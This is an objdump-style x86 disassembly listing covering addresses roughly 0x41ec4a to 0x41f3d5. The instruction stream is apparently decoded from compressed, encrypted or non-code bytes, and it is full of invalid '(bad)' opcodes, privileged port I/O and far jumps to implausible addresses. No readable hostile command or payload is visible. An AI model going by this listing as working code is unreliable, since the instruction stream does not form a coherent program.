  41ec4a:	aam    0xb3
  41ec4c:	jge    0x41eca3
  41ec4e:	push   ds
  41ec4f:	and    DWORD PTR [esi],edx
  41ec51:	jecxz  0x41ecbf
  41ec53:	sar    BYTE PTR [edi],0x99
  41ec56:	or     cl,BYTE PTR [esi+edx*2+0x3d1699d6]
  41ec5d:	cmp    eax,0x285004d8
  41ec62:	gs fucomi st,st(6)
  41ec65:	sti    
  41ec66:	(bad)  
  41ec67:	sbb    eax,DWORD PTR [ebp+0x735e68a]
  41ec6d:	gs pop ecx
  41ec6f:	dec    edx
  41ec70:	pop    esp
  41ec71:	mov    ecx,0x18a6a96b
  41ec76:	pop    ebx
  41ec78:	xchg   DWORD PTR [edx-0x7e2c4e6a],ebp
  41ec7e:	jae    0x41ec0d
  41ec80:	ret    
  41ec81:	and    al,0xde
  41ec83:	mov    DWORD PTR [esp+esi*4],esi
  41ec86:	ins    DWORD PTR es:[edi],dx
  41ec87:	mov    dl,0xe7
  41ec89:	and    BYTE PTR [eax+0x4985e78c],bl
  41ec8f:	(bad)  
  41ec90:	add    BYTE PTR ds:0xcd7b3d8,ch
  41ec96:	ror    BYTE PTR [ebx-0x386b90b3],0x26
  41ec9d:	je     0x41ec8b
  41ec9f:	sub    DWORD PTR [ebx+0x45],eax
  41eca2:	les    ecx,FWORD PTR [esi-0x3d910c41]
  41eca8:	push   ss
  41eca9:	call   0x9971bc9f
  41ecae:	repnz mov eax,0x866e58db
  41ecb4:	in     al,dx
  41ecb5:	dec    eax
  41ecb6:	fwait
  41ecb7:	fwait
  41ecb8:	push   edx
  41ecb9:	test   BYTE PTR [eax],ch
  41ecbb:	add    cl,BYTE PTR [eiz*1+0x5afd]
	...
  41ecca:	add    BYTE PTR [edx],dh
  41eccc:	ror    esi,cl
  41ecce:	mov    ds:0xd37ebfef,al
  41ecd3:	sub    edi,DWORD PTR [esi]
  41ecd5:	out    0x3f,eax
  41ecd7:	(bad)  
  41ecd8:	(bad)  [edi+0x18fd24e]
  41ecde:	add    BYTE PTR [ebp-0x26000000],ch
  41ece4:	(bad)  
  41ece5:	dec    ebx
  41ece6:	sahf   
  41ece7:	aam    0x8e
  41ece9:	sbb    eax,0x3349075c
  41ecee:	or     eax,edx
  41ecf0:	xor    dh,ah
  41ecf2:	mov    edx,0xba459df4
  41ecf7:	mov    dh,0x1b
  41ecf9:	(bad)  
  41ecfa:	pop    edi
  41ecfb:	xchg   esi,eax
  41ecfc:	dec    ecx
  41ecfd:	shr    DWORD PTR [edi-0x2b],cl
  41ed00:	mov    dl,0x1f
  41ed02:	(bad)  
  41ed03:	sbb    DWORD PTR [edi+edx*2],eax
  41ed06:	js     0x41ed66
  41ed08:	iret   
  41ed09:	dec    ebx
  41ed0a:	ja     0x41ed7d
  41ed0c:	xchg   ebx,eax
  41ed0d:	scas   eax,DWORD PTR es:[edi]
  41ed0e:	test   DWORD PTR [esi-0x9287dcb],edx
  41ed14:	add    al,0x9e
  41ed16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed17:	inc    edi
  41ed18:	mov    edx,0x4fcdff30
  41ed1d:	fimul  DWORD PTR [ebp-0x5f]
  41ed20:	sub    al,0x67
  41ed22:	push   ebx
  41ed23:	shl    BYTE PTR [ecx+0x26b23279],0xb1
  41ed2a:	dec    ecx
  41ed2b:	and    al,0x85
  41ed2d:	mov    eax,DWORD PTR [ecx]
  41ed2f:	retf   0xb9dd
  41ed32:	pushf  
  41ed33:	xchg   edi,eax
  41ed34:	int3   
  41ed35:	sub    al,0xc3
  41ed37:	mov    ds:0xe3dfea12,al
  41ed3c:	shl    ah,cl
  41ed3e:	sub    edx,edx
  41ed40:	inc    ebx
  41ed41:	std    
  41ed42:	push   ds
  41ed43:	and    al,BYTE PTR [edi+0x0]
  41ed46:	out    0x68,al
  41ed48:	sub    al,0xc4
  41ed4a:	das    
  41ed4b:	add    DWORD PTR ds:0xdd160278,0x6e
  41ed52:	(bad)  
  41ed53:	pusha  
  41ed54:	call   0xa7f575b0
  41ed59:	mov    BYTE PTR [ecx],al
  41ed5b:	xchg   ebp,eax
  41ed5c:	add    al,0xd5
  41ed5e:	adc    ch,BYTE PTR [ebp+0x48]
  41ed61:	mov    esi,0x988b4056
  41ed66:	sti    
  41ed67:	inc    edi
  41ed68:	aaa    
  41ed69:	int    0x87
  41ed6b:	(bad)  
  41ed6c:	pop    esp
  41ed6d:	(bad)  
  41ed6e:	scas   eax,DWORD PTR es:[edi]
  41ed6f:	xchg   edx,eax
  41ed70:	fiadd  WORD PTR [ebp-0x3a85d958]
  41ed76:	fisub  DWORD PTR [edx]
  41ed78:	adc    ecx,ebp
  41ed7a:	aaa    
  41ed7b:	jmp    0xcbd671ff
  41ed80:	pop    eax
  41ed81:	popa   
  41ed82:	in     eax,0x20
  41ed84:	popa   
  41ed85:	push   ecx
  41ed86:	pushf  
  41ed87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed88:	jno    0x41ed1d
  41ed8a:	js     0x41ed7e
  41ed8c:	and    dl,dh
  41ed8e:	mov    al,0x80
	...
  41ed98:	add    BYTE PTR [eax],al
  41ed9a:	add    bl,bl
  41ed9c:	in     eax,dx
  41ed9d:	outs   dx,BYTE PTR ds:[esi]
  41ed9e:	and    bh,BYTE PTR [esi-0x5d]
  41eda1:	(bad)  
  41eda3:	pop    esi
  41eda4:	(bad)  
  41eda5:	mov    DWORD PTR [ebp+0xc904243],ecx
  41edab:	jg     0x41ed3d
  41edad:	add    DWORD PTR [eax],eax
  41edaf:	lods   eax,DWORD PTR ds:[esi]
  41edb0:	add    BYTE PTR [eax],al
  41edb2:	add    BYTE PTR [ebx-0x30432d7],bl
  41edb8:	loop   0x41edbe
  41edba:	(bad)  
  41edbc:	int3   
  41edbd:	or     dh,BYTE PTR [edx-0x3f0e88a4]
  41edc3:	(bad)  
  41edc4:	push   esi
  41edc5:	sbb    esi,0x9b5583ee
  41edcb:	sbb    eax,0x17ffb9fd
  41edd0:	dec    ecx
  41edd1:	call   0x3dde:0x1de44c7b
  41edd8:	mov    ch,0x88
  41edda:	daa    
  41eddb:	hlt    
  41eddc:	cdq    
  41eddd:	jbe    0x41ede2
  41eddf:	in     eax,dx
  41ede0:	inc    ebx
  41ede1:	and    eax,0xf56ee389
  41ede6:	sub    DWORD PTR ds:0xe0dde96f,eax
  41edec:	in     eax,0xf9
  41edee:	test   eax,0x220b36ff
  41edf3:	retf   
  41edf4:	loope  0x41edb9
  41edf6:	dec    edx
  41edf7:	xlat   BYTE PTR ds:[ebx]
  41edf8:	xor    BYTE PTR ds:0x3b57e07a,cl
  41edfe:	push   eax
  41edff:	mov    ebp,0xb9949e2a
  41ee04:	fld    QWORD PTR [ecx+0xef59dc2]
  41ee0a:	xchg   esi,eax
  41ee0b:	aas    
  41ee0c:	retf   
  41ee0d:	in     al,dx
  41ee0e:	mov    edi,0x4167a2f5
  41ee13:	lods   eax,DWORD PTR ds:[esi]
  41ee14:	mov    esp,0xeab46c3
  41ee19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee1a:	cld    
  41ee1b:	lea    ebx,[eax+0x79]
  41ee1e:	(bad)  
  41ee1f:	jns    0x41edf8
  41ee21:	cmp    eax,0xfd1092c2
  41ee26:	push   es
  41ee27:	push   edi
  41ee28:	(bad)  
  41ee29:	and    al,0xa4
  41ee2b:	inc    edx
  41ee2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee2d:	cmp    DWORD PTR [esi],ebp
  41ee2f:	das    
  41ee30:	adc    DWORD PTR [edi-0x16],ebp
  41ee33:	mov    esi,0xde3412f0
  41ee38:	sbb    cl,BYTE PTR [ebx]
  41ee3a:	loope  0x41eeb7
  41ee3c:	cmp    esi,edi
  41ee3e:	mov    cl,0x53
  41ee40:	iret   
  41ee41:	dec    ebp
  41ee42:	dec    esp
  41ee43:	fiadd  DWORD PTR [eax]
  41ee45:	xchg   edx,eax
  41ee46:	retf   0x7000
  41ee49:	adc    al,0xc1
  41ee4b:	in     eax,dx
  41ee4c:	xor    eax,0x9803a489
  41ee51:	cmp    DWORD PTR [edi+0x6d],eax
  41ee54:	sbb    al,0xb9
  41ee56:	sahf   
  41ee57:	push   ss
  41ee58:	fimul  DWORD PTR [edx-0x4e]
  41ee5b:	les    ebx,FWORD PTR [bx+si-0x27]
  41ee5f:	rol    DWORD PTR [eax],cl
	...
  41ee69:	add    BYTE PTR [eax],al
  41ee6b:	add    eax,0x6f976b22
  41ee70:	(bad)  
  41ee72:	mov    dl,0x66
  41ee74:	and    BYTE PTR [esi+0x75caf76a],ah
  41ee7a:	fsubr  QWORD PTR [ecx+edx*4]
  41ee7d:	add    DWORD PTR [eax],eax
  41ee7f:	lods   eax,DWORD PTR ds:[esi]
  41ee80:	add    BYTE PTR [eax],al
  41ee82:	add    BYTE PTR ds:0x653a8d5a,ah
  41ee88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee89:	loopne 0x41ee6c
  41ee8b:	pop    ebp
  41ee8c:	retf   0x6f75
  41ee8f:	fs imul ebp,edi,0xac25f4e4
  41ee96:	xchg   ebp,eax
  41ee97:	stc    
  41ee98:	adc    DWORD PTR [ebx],edx
  41ee9a:	dec    eax
  41ee9b:	xor    ecx,eax
  41ee9d:	pusha  
  41ee9e:	in     al,0xa1
  41eea0:	mov    ds:0xc8806084,al
  41eea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eea6:	pop    ss
  41eea7:	jge    0x41ee5c
  41eea9:	jge    0x41ee4a
  41eeab:	xor    eax,0xb5daea8a
  41eeb0:	add    eax,esp
  41eeb2:	mov    eax,ds:0x367ee303
  41eeb7:	or     ah,cl
  41eeb9:	or     BYTE PTR [ebx-0x16],ch
  41eebc:	jb     0x41eeb7
  41eebe:	mov    ebx,0x952174e3
  41eec3:	rcr    ecx,cl
  41eec5:	test   BYTE PTR [ebx-0x3b],dl
  41eec8:	data16 adc BYTE PTR [esi+0x67],cl
  41eecc:	pop    edx
  41eecd:	push   0xb5ce3fb1
  41eed2:	lods   al,BYTE PTR ds:[esi]
  41eed3:	jb     0x41eed8
  41eed5:	retf   
  41eed6:	mov    ebx,0x57de229b
  41eedb:	js     0x41eee7
  41eedd:	jns    0x41ef4a
  41eedf:	pop    edx
  41eee0:	adc    BYTE PTR [ebx-0x446776c1],ah
  41eee6:	jmp    0x41ee96
  41eee8:	xchg   edi,eax
  41eee9:	loopne 0x41ef5a
  41eeeb:	stos   BYTE PTR es:[edi],al
  41eeec:	dec    ecx
  41eeed:	call   FWORD PTR [ebx-0x75]
  41eef0:	mul    BYTE PTR [eax]
  41eef2:	(bad)  
  41eef3:	push   0x941ac35b
  41eef8:	sub    ecx,DWORD PTR [ebp-0x1a]
  41eefb:	inc    eax
  41eefc:	xor    ebx,esp
  41eefe:	scas   eax,DWORD PTR es:[edi]
  41eeff:	shl    BYTE PTR [edx],0xa9
  41ef02:	(bad)  [bp+di]
  41ef05:	ficomp DWORD PTR [esi+0x2d]
  41ef08:	push   edx
  41ef09:	xchg   DWORD PTR [ecx-0x7],ebp
  41ef0c:	adc    BYTE PTR [esp+ecx*1-0x34],bh
  41ef10:	mov    edx,0xd2930df6
  41ef15:	stos   DWORD PTR es:[edi],eax
  41ef16:	mov    edx,DWORD PTR [edi]
  41ef18:	mov    ah,0xa0
  41ef1a:	jecxz  0x41eeda
  41ef1c:	cmp    al,BYTE PTR [ebx-0x2cf2aa8d]
  41ef22:	sbb    al,0xb4
  41ef24:	std    
  41ef25:	test   BYTE PTR [ebx],cl
  41ef27:	and    DWORD PTR [ebp+0x42aacbb4],eax
  41ef2d:	jo     0x41eee5
  41ef2f:	add    eax,DWORD PTR [eax]
	...
  41ef39:	add    BYTE PTR [eax],al
  41ef3b:	mov    edx,esp
  41ef3d:	and    al,0xd9
  41ef3f:	jg     0x41ef3a
  41ef41:	call   esi
  41ef43:	into   
  41ef44:	inc    ebp
  41ef45:	mov    bh,0x11
  41ef47:	cmp    dh,0x38
  41ef4a:	enter  0x91d9,0x1
  41ef4e:	add    BYTE PTR [ebp-0x52000000],ch
  41ef54:	pop    es
  41ef55:	les    edx,FWORD PTR [esi+0x37]
  41ef58:	mov    edx,DWORD PTR [esi-0x294f57f]
  41ef5e:	test   eax,0x46a2e953
  41ef63:	pop    es
  41ef64:	mov    ecx,0xbc07b9db
  41ef69:	add    bh,BYTE PTR [eax+0x27]
  41ef6c:	and    eax,0xafdd8004
  41ef71:	push   cs
  41ef72:	sbb    BYTE PTR [ebx-0x26],dh
  41ef75:	adc    ch,dh
  41ef77:	gs inc edi
  41ef79:	pop    ecx
  41ef7a:	cli    
  41ef7b:	inc    ecx
  41ef7c:	fsub   st,st(2)
  41ef7e:	stc    
  41ef7f:	mov    eax,0x12b8bf9d
  41ef84:	xchg   esi,eax
  41ef85:	daa    
  41ef86:	daa    
  41ef87:	add    esp,ecx
  41ef89:	lea    ebp,[eax-0x5e]
  41ef8c:	fimul  WORD PTR [ecx-0x6411e4ef]
  41ef92:	das    
  41ef93:	mov    cl,0x24
  41ef95:	dec    ecx
  41ef96:	jbe    0x41efd5
  41ef98:	lods   al,BYTE PTR ds:[esi]
  41ef99:	or     ebx,0x1f791ac7
  41ef9f:	push   ebp
  41efa0:	loopne 0x41f008
  41efa2:	cmp    BYTE PTR [eax],dl
  41efa4:	pop    ebp
  41efa5:	test   eax,0x48a1bd61
  41efaa:	popa   
  41efab:	out    dx,al
  41efac:	(bad)  
  41efad:	outs   dx,DWORD PTR ds:[esi]
  41efae:	popf   
  41efaf:	mov    dl,0x4d
  41efb1:	mov    WORD PTR [ecx-0x75],cs
  41efb4:	sub    DWORD PTR [ebx],ecx
  41efb6:	push   ebx
  41efb7:	inc    esi
  41efb8:	outs   dx,BYTE PTR ds:[esi]
  41efb9:	jns    0x41efa7
  41efbb:	sub    edx,eax
  41efbd:	pop    esi
  41efbe:	in     al,dx
  41efbf:	mov    ecx,0x4f3dc46e
  41efc4:	test   BYTE PTR [esi-0x9],0xc0
  41efc8:	in     al,0xc3
  41efca:	jmp    0x3a91c6a6
  41efcf:	out    0xf9,al
  41efd1:	or     cl,BYTE PTR [ecx+0x52]
  41efd4:	fs (bad) 
  41efd6:	jmp    0x45dea060
  41efdb:	retf   0x79b0
  41efde:	cmp    BYTE PTR [ecx],ch
  41efe0:	out    dx,al
  41efe1:	sub    al,0xfd
  41efe3:	xor    al,BYTE PTR [edx]
  41efe5:	imul   esi,edi,0xc7268a4f
  41efeb:	mov    ebp,0xab7c1f5c
  41eff0:	jg     0x41f003
  41eff2:	fld    QWORD PTR [esi]
  41eff4:	jmp    0x41efac
  41eff6:	dec    edi
  41eff7:	adc    BYTE PTR [ebp+edx*2+0x1bf13234],al
  41effe:	cwde   
  41efff:	xor    eax,DWORD PTR [eax]
	...
  41f009:	add    BYTE PTR [eax],al
  41f00b:	fisubr WORD PTR [ecx]
  41f00d:	cwde   
  41f00e:	sar    bh,cl
  41f010:	repz fisubr WORD PTR ds:0x4af35f6
  41f017:	fcmovnu st,st(3)
  41f019:	push   ebp
  41f01a:	mov    al,BYTE PTR [esi-0x52fffe6e]
  41f020:	add    BYTE PTR [eax],al
  41f022:	add    BYTE PTR [esi],cl
  41f024:	push   esp
  41f025:	sub    ebp,DWORD PTR [ebp-0x5c]
  41f028:	mov    ds:0xde3ebbb3,eax
  41f02d:	add    esi,DWORD PTR [ebp-0x59b112e9]
  41f033:	dec    edx
  41f034:	mov    DWORD PTR [edi+0xa],eax
  41f037:	adc    edx,DWORD PTR [edi+0x13]
  41f03a:	xchg   DWORD PTR [ecx+0x5f19fdb1],ebx
  41f040:	(bad)  
  41f041:	cmp    DWORD PTR [ebx-0x6d50c5d1],edx
  41f047:	push   eax
  41f048:	cld    
  41f049:	add    dl,BYTE PTR [edx-0x265e733]
  41f04f:	xor    eax,0xfeefc7f0
  41f054:	sub    ah,BYTE PTR [edi]
  41f056:	outs   dx,DWORD PTR ds:[esi]
  41f057:	out    dx,al
  41f058:	call   0x631ee6d0
  41f05d:	mov    eax,0x35d5c1f2
  41f062:	dec    edx
  41f063:	jae    0x41eff9
  41f065:	pop    edx
  41f066:	pop    esi
  41f067:	loope  0x41f004
  41f069:	lahf   
  41f06a:	in     eax,dx
  41f06b:	(bad)  
  41f06c:	lea    esi,[ebx]
  41f06e:	pop    edx
  41f06f:	ret    
  41f070:	sub    eax,0xf16e6973
  41f075:	loop   0x41f0ba
  41f077:	stos   BYTE PTR es:[edi],al
  41f078:	jno    0x41f03b
  41f07a:	xchg   ecx,eax
  41f07b:	pop    ss
  41f07c:	cmp    eax,0xff504d8a
  41f081:	jecxz  0x41f094
  41f083:	dec    esi
  41f084:	lock ins DWORD PTR es:[edi],dx
  41f086:	repz loopne 0x41f075
  41f089:	clc    
  41f08a:	push   esp
  41f08b:	push   0xf8d223bf
  41f090:	jp     0x41f0ec
  41f092:	scas   eax,DWORD PTR es:[edi]
  41f093:	push   eax
  41f094:	push   ebp
  41f095:	out    0x63,eax
  41f097:	loopne 0x41f040
  41f099:	das    
  41f09a:	inc    BYTE PTR [eax-0x29a756f2]
  41f0a0:	ror    DWORD PTR [esi-0x35],1
  41f0a3:	int    0x54
  41f0a5:	cmp    al,0x5f
  41f0a7:	inc    esp
  41f0a8:	lods   eax,DWORD PTR ds:[esi]
  41f0a9:	dec    esp
  41f0aa:	push   0xfffffffc
  41f0ac:	dec    ecx
  41f0ad:	sbb    edx,ebp
  41f0af:	adc    eax,0x425cecb3
  41f0b4:	fwait
  41f0b5:	cmp    al,0x47
  41f0b7:	lods   eax,DWORD PTR ds:[esi]
  41f0b8:	pushw  ds
  41f0ba:	xchg   edx,eax
  41f0bb:	inc    ebx
  41f0bc:	jl     0x41f0d2
  41f0be:	ret    
  41f0bf:	dec    ebx
  41f0c0:	(bad)  
  41f0c1:	jae    0x41f0fe
  41f0c3:	mov    al,0x35
  41f0c5:	jb     0x41f0ac
  41f0c7:	mov    bl,0xd7
  41f0c9:	pushf  
  41f0ca:	push   cs
  41f0cb:	call   0x0:0x9a7c41e4
	...
  41f0da:	add    BYTE PTR [esi+0x3f],cl
  41f0dd:	int3   
  41f0de:	sbb    eax,0x7fdffffd
  41f0e3:	out    dx,eax
  41f0e4:	loopne 0x41f0fc
  41f0e6:	lods   al,BYTE PTR ds:[esi]
  41f0e7:	rol    DWORD PTR [edi],cl
  41f0e9:	mov    ?,ebx
  41f0eb:	xor    edx,DWORD PTR [ebx+0xad0001]
  41f0f1:	add    BYTE PTR [eax],al
  41f0f3:	lahf   
  41f0f4:	cwde   
  41f0f5:	jp     0x41f144
  41f0f7:	jge    0x41f14d
  41f0f9:	xlat   BYTE PTR ds:[ebx]
  41f0fa:	mov    ch,cl
  41f0fc:	lods   al,BYTE PTR ds:[esi]
  41f0fd:	dec    esi
  41f0fe:	xor    bh,BYTE PTR [edx]
  41f100:	xchg   edx,eax
  41f101:	jno    0x41f0f6
  41f103:	inc    eax
  41f104:	sub    bh,BYTE PTR [ecx-0xa35d050]
  41f10a:	and    al,0x4b
  41f10c:	adc    edi,DWORD PTR [ebx+eax*8+0x72]
  41f110:	jne    0x41f135
  41f112:	sbb    DWORD PTR [eax-0x27],ebx
  41f115:	aaa    
  41f116:	jle    0x41f0f3
  41f118:	mov    esp,0xecb91423
  41f11d:	cwde   
  41f11e:	and    edi,DWORD PTR [eax-0x482fc4c1]
  41f124:	jo     0x41f15c
  41f126:	adc    eax,0xa0ed3d3b
  41f12b:	rcl    BYTE PTR [edi],1
  41f12d:	adc    DWORD PTR [eax],esi
  41f12f:	je     0x41f117
  41f131:	cmp    al,0x9a
  41f133:	inc    eax
  41f135:	adc    DWORD PTR [ebx],0xffffffcf
  41f138:	dec    dl
  41f13a:	lods   al,BYTE PTR ds:[esi]
  41f13c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f13d:	adc    BYTE PTR [edi],bl
  41f13f:	xchg   BYTE PTR [eax+0x70e8c265],al
  41f145:	das    
  41f146:	jne    0x41f120
  41f148:	xchg   bl,bh
  41f14a:	push   edx
  41f14b:	test   al,0x93
  41f14d:	lahf   
  41f14e:	sbb    bh,bl
  41f150:	lds    eax,FWORD PTR [esi-0x7e]
  41f153:	ins    BYTE PTR es:[edi],dx
  41f154:	push   eax
  41f155:	shl    ebx,1
  41f157:	or     eax,DWORD PTR [eax-0x7]
  41f15a:	jo     0x41f0f4
  41f15c:	pop    esi
  41f15d:	jno    0x41f19c
  41f15f:	mov    bh,0xba
  41f161:	nop
  41f162:	push   edx
  41f163:	pop    ss
  41f164:	sbb    esp,esp
  41f166:	push   esp
  41f167:	gs jnp 0x41f190
  41f16a:	lods   eax,DWORD PTR ds:[esi]
  41f16b:	js     0x41f191
  41f16d:	lods   eax,DWORD PTR ds:[esi]
  41f16e:	jo     0x41f0f5
  41f170:	or     BYTE PTR [ebp-0x34a1c400],cl
  41f176:	hlt    
  41f177:	fiadd  DWORD PTR [ecx]
  41f179:	gs idiv esp
  41f17c:	gs int 0xdb
  41f17f:	adc    cl,dl
  41f181:	ror    BYTE PTR [edi],1
  41f183:	sub    eax,0xdb883b37
  41f188:	es xor al,0xcc
  41f18b:	adc    esp,esi
  41f18d:	mov    edi,0xac544a0
  41f192:	push   ecx
  41f193:	cmc    
  41f194:	mov    al,ds:0x3d9fb128
  41f199:	fwait
  41f19a:	(bad)  
  41f19b:	xor    eax,0xae71e03b
	...
  41f1a8:	add    BYTE PTR [eax],al
  41f1aa:	add    BYTE PTR [esi],bl
  41f1ac:	test   eax,0x7ff735f6
  41f1b1:	fild   QWORD PTR [ebx-0x5f9ed871]
  41f1b7:	or     al,0x6b
  41f1b9:	call   0x1d5d1e7
  41f1be:	add    BYTE PTR [ebp+0x6a000000],ch
  41f1c4:	inc    edx
  41f1c5:	or     al,BYTE PTR [edx]
  41f1c7:	xor    al,0x1d
  41f1c9:	rcl    DWORD PTR [eax],1
  41f1cb:	mov    bl,BYTE PTR [ebp-0x4bad9ca0]
  41f1d1:	mov    eax,0xaebb29a9
  41f1d6:	sub    DWORD PTR [edx+0x4b9bf3a2],eax
  41f1dc:	mov    al,0x68
  41f1de:	shl    cl,0x21
  41f1e1:	ret    
  41f1e2:	push   ebx
  41f1e3:	test   DWORD PTR [ebx+0x44],0x3f27e036
  41f1ea:	jbe    0x41f1c6
  41f1ec:	xchg   BYTE PTR [ebx-0x57],dh
  41f1ef:	adc    edx,edi
  41f1f1:	dec    edx
  41f1f2:	xor    bh,bl
  41f1f4:	test   DWORD PTR [eax-0x53],esi
  41f1f7:	cmp    esp,esi
  41f1f9:	cmp    BYTE PTR [ecx],dl
  41f1fb:	std    
  41f1fc:	sub    al,0x8c
  41f1fe:	add    BYTE PTR [ebp+0x11],dh
  41f201:	cmp    esp,0xe6bbaed1
  41f207:	mov    ebx,0x64163ca0
  41f20c:	adc    BYTE PTR [ebp-0x7],0xae
  41f210:	or     DWORD PTR [esi],esi
  41f212:	(bad)  
  41f213:	cmp    DWORD PTR [ecx-0x67210726],ebx
  41f219:	rol    cl,0x4c
  41f21c:	call   0x82d6e74e
  41f221:	jmp    0x5e4f:0xa24e6a2d
  41f228:	push   es
  41f229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f22a:	inc    BYTE PTR [eax-0x865bbc2]
  41f230:	xor    BYTE PTR [ebp-0x3d],bh
  41f233:	jp     0x41f1e2
  41f235:	sub    BYTE PTR [ecx+0x170c4f9a],0xe3
  41f23c:	lods   eax,DWORD PTR ds:[esi]
  41f23d:	pop    edx
  41f23e:	repz out 0x86,eax
  41f241:	lahf   
  41f242:	fsubr  st(2),st
  41f244:	xchg   DWORD PTR [esi-0x1b48f14a],ebp
  41f24a:	test   DWORD PTR [edi],ebx
  41f24c:	dec    edx
  41f24d:	xchg   esp,eax
  41f24e:	xchg   esi,eax
  41f24f:	or     ch,al
  41f251:	das    
  41f252:	or     esp,DWORD PTR [ecx+0x3a7d07c1]
  41f258:	jne    0x41f237
  41f25a:	adc    eax,0xd8949d25
  41f25f:	xor    eax,0xb90f48ae
  41f264:	test   ah,al
  41f266:	imul   esi,DWORD PTR [ebx+edi*8-0x6b2df17],0xffffffa6
  41f26e:	cli    
  41f26f:	and    al,0x0
	...
  41f279:	add    BYTE PTR [eax],al
  41f27b:	fwait
  41f27c:	loope  0x41f2eb
  41f27e:	sub    eax,0xf7dbad7f
  41f283:	sar    BYTE PTR [ebx],cl
  41f285:	(bad)  
  41f286:	add    dl,bh
  41f288:	push   ss
  41f289:	mov    edi,0x1948dd0
  41f28e:	add    BYTE PTR [ebp-0x25000000],ch
  41f294:	enter  0x9e12,0xc7
  41f298:	mov    eax,0x4aef327f
  41f29d:	xchg   ecx,eax
  41f29e:	repz (bad) 
  41f2a0:	mov    al,0xbf
  41f2a2:	jnp    0x41f236
  41f2a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2a5:	cmp    dl,BYTE PTR [edx-0x36]
  41f2a8:	jmp    0xfd51:0x238a758b
  41f2af:	fisttp WORD PTR [ebp-0x1e52f5f1]
  41f2b5:	xchg   DWORD PTR [ebx-0x70],ebx
  41f2b8:	test   al,0xd4
  41f2ba:	arpl   WORD PTR [ebx+esi*4],dx
  41f2bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2be:	shl    BYTE PTR [ebp-0xb],1
  41f2c1:	aam    0x2
  41f2c3:	cmp    DWORD PTR [eax-0x34133e89],esi
  41f2c9:	cwde   
  41f2ca:	cmp    dl,BYTE PTR [ebx+esi*1+0x2496474]
  41f2d1:	gs mov ah,0xbb
  41f2d4:	aas    
  41f2d5:	push   0xa
  41f2d7:	push   0x6
  41f2d9:	pop    ebx
  41f2da:	rcr    BYTE PTR [ebx-0x239585d9],cl
  41f2e0:	(bad)  
  41f2e1:	repnz sub eax,0x43899ef5
  41f2e7:	xchg   ebx,eax
  41f2e8:	xor    BYTE PTR [ebp+0x463a3141],ah
  41f2ee:	out    0x55,eax
  41f2f0:	popa   
  41f2f1:	int3   
  41f2f2:	popa   
  41f2f3:	das    
  41f2f4:	ret    0x18ab
  41f2f7:	(bad)  
  41f2f8:	pop    ebx
  41f2f9:	and    eax,DWORD PTR [edi-0x45]
  41f2fc:	sahf   
  41f2fd:	icebp  
  41f2fe:	sub    al,0x34
  41f300:	lods   al,BYTE PTR ds:[esi]
  41f301:	popa   
  41f302:	jg     0x41f36e
  41f304:	mov    edx,0xfa72e77e
  41f309:	ins    BYTE PTR es:[edi],dx
  41f30a:	lds    ecx,FWORD PTR [ecx]
  41f30c:	popa   
  41f30d:	xor    al,0xc5
  41f30f:	sahf   
  41f310:	into   
  41f311:	stos   DWORD PTR es:[edi],eax
  41f312:	addr16 jp 0x41f2ce
  41f315:	int3   
  41f316:	cdq    
  41f317:	loopne 0x41f2c6
  41f319:	pushf  
  41f31a:	ret    0x70a4
  41f31d:	test   al,0xbf
  41f31f:	dec    eax
  41f320:	sbb    DWORD PTR [ecx+esi*4],0x0
  41f324:	add    al,BYTE PTR [esi+0x8]
  41f327:	sahf   
  41f328:	push   edx
  41f329:	jno    0x41f2af
  41f32b:	push   0x3405da84
  41f330:	pop    ecx
  41f331:	dec    ecx
  41f332:	ret    
  41f333:	adc    eax,0xb923c249
  41f338:	test   al,0x19
  41f33a:	xchg   esi,eax
  41f33b:	mov    eax,DWORD PTR [edi-0x76]
  41f33e:	je     0x41f372
	...
  41f348:	add    BYTE PTR [eax],al
  41f34a:	add    BYTE PTR [eax],cl
  41f34c:	div    DWORD PTR [edi+0x4a]
  41f34f:	dec    edx
  41f351:	cmp    eax,0x2e8eedf7
  41f356:	dec    eax
  41f357:	std    
  41f358:	ficomp DWORD PTR [ecx+0x1953ad8]
  41f35e:	add    BYTE PTR [ebp-0x6a000000],ch
  41f364:	add    al,0x11
  41f366:	fwait
  41f367:	dec    esp
  41f368:	sub    dh,BYTE PTR cs:[ebx]
  41f36b:	iret   
  41f36c:	and    al,0x3d
  41f36e:	pop    ebp
  41f36f:	repz into 
  41f371:	cld    
  41f372:	test   al,0x93
  41f374:	sar    DWORD PTR ds:0x9b0246a3,1
  41f37a:	rcr    BYTE PTR [edi-0x60e1a3ac],0xcf
  41f381:	cmp    al,0x98
  41f383:	jecxz  0x41f338
  41f385:	push   ebx
  41f386:	aad    0xdb
  41f388:	jge    0x41f3a5
  41f38a:	out    0xaa,eax
  41f38c:	mov    cl,0x5a
  41f38e:	mov    cl,0x8f
  41f390:	jno    0x41f323
  41f392:	js     0x41f36b
  41f394:	cdq    
  41f395:	stos   BYTE PTR es:[edi],al
  41f396:	inc    edx
  41f397:	inc    eax
  41f398:	adc    BYTE PTR es:[edx-0x77],ah
  41f39c:	cmp    eax,0x125cebe3
  41f3a1:	mov    ah,0xed
  41f3a3:	test   al,0xda
  41f3a5:	add    eax,0x4cdb57bb
  41f3aa:	xor    BYTE PTR [ebx],ch
  41f3ac:	retf   
  41f3ad:	or     cl,BYTE PTR fs:[edi+0x44]
  41f3b1:	mov    ah,0xa3
  41f3b3:	or     DWORD PTR [edi+0x15a96a22],ebp
  41f3b9:	adc    al,0x63
  41f3bb:	lea    esi,[ebp+0x3c655c3e]
  41f3c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3c2:	pop    edi
  41f3c3:	stc    
  41f3c4:	shl    BYTE PTR ds:0xec964b3d,0x4
  41f3cb:	adc    eax,0x5bc9c05b
  41f3d0:	mov    cl,0xbd
  41f3d2:	aam    0x7d
  41f3d4:	into   
  41f3d5:	and    bh,BYTE PTR [ebx-0x6cc4da22]
